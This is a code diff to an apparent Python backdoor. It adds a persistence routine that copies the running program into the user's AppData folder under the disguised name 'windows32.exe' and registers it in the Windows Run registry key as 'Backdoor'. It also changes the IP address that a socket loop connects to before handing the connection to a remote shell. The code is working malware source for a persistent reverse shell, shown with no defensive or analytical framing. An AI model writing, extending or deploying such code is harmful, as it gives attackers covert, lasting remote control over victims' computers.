@@ -2,6 +2,15 @@ import os
 import socket
 import subprocess
 import time
+import sys
+import shutil
+
+def registry():
+    location = os.environ['appdata']+'\\windows32.exe'
+    if not(os.path.exists(location)):
+        shutil.copyfile(sys.executable, location)
+        subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
+    
 
 def checkAdmin():
     try:
@@ -21,7 +30,7 @@ def tuneConnection():
     while True:
         time.sleep(1)
         try:
-            mySocket.connect(('192.168.81.128', 8080))
+            mySocket.connect(('192.168.81.129', 8080))
             shell(mySocket)
 
         except:
